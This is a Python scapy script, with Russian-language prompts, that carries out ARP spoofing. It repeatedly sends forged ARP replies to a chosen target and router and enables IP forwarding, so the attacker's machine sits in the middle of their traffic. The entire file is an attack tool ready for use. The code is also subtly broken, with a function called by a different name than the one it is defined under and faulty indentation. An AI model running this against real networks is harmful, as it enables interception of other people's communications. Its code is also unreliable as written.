#!/usr/bin/python
    from scapy.all import *
    import argparse
    import signal
    import sys
    import logging
    import time
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    def originalMAC(ip):
    ans,unans = srp(ARP(pdst=ip), timeout=5, retry=3)
    for s,r in ans:
        return r[Ether].src
    def parse_args():
        parser = argparse.ArgumentParser()
        parser.add_argument("-t", "--targetIP", help="Введите IP-адрес цели, напрмер: -t 192.168.1.5")
        parser.add_argument("-r", "--routerIP", help="Введите IP-адрес роутера, напрмер: -r 192.168.1.1")
        return parser.parse_args()
    def poison(routerIP, targetIP, routerMAC, targetMAC):
        send(ARP(op=2, pdst=targetIP, psrc=routerIP, hwdst=targetMAC))
        send(ARP(op=2, pdst=routerIP, psrc=targetIP, hwdst=routerMAC))
    def restore(routerIP, targetIP, routerMAC, targetMAC):
        send(ARP(op=2, pdst=routerIP, psrc=targetIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=targetMAC), count=3)
        send(ARP(op=2, pdst=targetIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)
        sys.exit("losing...") 
    def main(args):
        if os.geteuid() != 0:
            sys.exit("[!] Пожалуйста запустите с правами root пользователя")
        routerIP = args.routerIP
        targetIP = args.targetIP
        routerMAC = OriginalMac(args.routerIP)
        targetMAC = OriginalMac(args.targetIP)
        if routerMAC == None:
            sys.exit("Не найден мак-адрес роутера. Закрытие....")
        if targetMAC == None:
            sys.exit("Не найден мак-адрес цели. Закрытие....")
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
            ipf.write('1\n')
        def signal_handler(signal, frame):
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
                ipf.write('0\n')
            restore(routerIP, targetIP, routerMAC, targetMAC)
        signal.signal(signal.SIGINT, signal_handler)
        while 1:
            poison(routerIP, targetIP, routerMAC, targetMAC)
            time.sleep(1.5)
    main(parse_args())